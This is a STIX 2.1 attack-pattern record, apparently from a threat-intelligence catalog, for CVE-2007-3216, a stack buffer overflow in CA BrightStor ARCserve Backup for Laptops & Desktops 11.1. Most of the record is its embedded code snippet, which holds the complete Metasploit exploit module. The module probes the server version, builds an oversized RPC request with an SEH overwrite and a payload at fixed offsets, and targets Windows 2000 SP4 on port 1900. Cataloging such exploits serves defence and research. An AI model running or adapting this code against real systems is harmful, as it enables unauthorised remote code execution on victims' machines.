{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85f46f80-26b5-4cd8-ac30-e20bddb82d2c",
    "created": "2024-08-14T16:48:24.856525Z",
    "modified": "2024-08-14T16:48:24.856529Z",
    "name": "CA BrightStor ARCserve for Laptops and Desktops LGServer Multiple Commands Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup for Laptops & Desktops 11.1. By sending a specially crafted request to multiple commands an attacker could overflow the buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/lgserver_multi.rb",
            "external_id": "lgserver_multi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3216"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor ARCserve for Laptops and Desktops LGServer Multiple Commands Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup\n        for Laptops & Desktops 11.1. By sending a specially crafted request to multiple commands,\n        an attacker could overflow the buffer and execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-3216' ],\n          [ 'OSVDB', '35329' ],\n          [ 'BID', '24348' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Windows 2000 SP4 English',\t{ 'Ret' => 0x75022ac4 } ],\n        ],\n      'DisclosureDate' => '2007-06-06',\n      'DefaultTarget' => 0))\n\n    register_options([ Opt::RPORT(1900) ])\n  end\n\n  def check\n\n    connect\n\n    sock.put(\"0000000019rxrGetServerVersion\")\n    ver = sock.get_once\n\n    disconnect\n\n    if ( ver and ver =~ /11\\.1\\.742/ )\n        return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n\n    connect\n\n    rpc_commands = [\n        \"rxsAddNewUser\",\n        \"rxsSetUserInfo\",\n        \"rxsRenameUser\",\n        \"rxsExportData\",\n        \"rxcReadSaveSetProfile\",\n        \"rxcInitSaveSetProfile\",\n        \"rxcAddSaveSetNextAppList\",\n        \"rxcAddSaveSetNextFilesPathList\"\n      ]\n\n    rpc_command = rpc_commands[rand(rpc_commands.length)]\n\n    data = rand_text_alpha_upper(62768)\n\n    data[58468,8] = generate_seh_record(target.ret)\n    data[58476,payload.encoded.length] = payload.encoded\n\n    sploit  = \"0000062768\"\t\t\t\t# Command Length Field\n    sploit << rpc_command\t\t\t\t# RPC Command\n    sploit << \"~~\"\t\t\t\t\t# Constant Argument Delimiter\n    sploit << data\n\n    print_status(\"Trying target #{target.name} with command '#{rpc_command}'...\")\n    sock.put(sploit)\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-06-06",
    "x_mitre_platforms": [
        "win'"
    ]
}